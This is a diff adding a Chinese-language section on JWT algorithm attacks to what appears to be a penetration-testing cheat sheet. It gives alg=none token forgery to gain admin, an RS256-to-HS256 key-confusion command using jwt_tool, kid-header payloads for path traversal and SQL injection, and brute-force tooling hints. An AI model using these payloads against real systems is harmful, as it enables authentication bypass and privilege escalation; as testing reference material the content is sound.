@@ -276,6 +276,25 @@ Session ID 可预测:
 python3 jwt_tool.py <JWT> -C -d rockyou.txt
 ```
 
+### 6.4 JWT 算法攻击
+
+```bash
+# === alg=none ===
+# header 改为 {"alg":"none"}，签名段置空 → payload.role 改 admin 后重放
+# 验证: 用篡改 Token 访问管理接口成功才算（仅接受 none 但无越权 → 不报）
+
+# === RS256 → HS256 混淆 ===
+# 服务端用公钥验证 HS256 → 拿公钥当 HMAC 密钥自签
+python3 jwt_tool.py <JWT> -S hs256 -k public.pem
+
+# === kid 注入 ===
+# header.kid 被拼进文件路径/SQL → 指向可控文件或注入
+{"alg":"HS256","kid":"../../../../dev/null"}        # 空密钥签名
+{"alg":"HS256","kid":"x' UNION SELECT 'secret'--"}  # SQL 注入取密钥
+
+# 自动化: jwt_tool -T (篡改) / hashcat -m 16500 (HS256 爆破)
+```
+
 ---
 
 ## 7. API 鉴权绕过
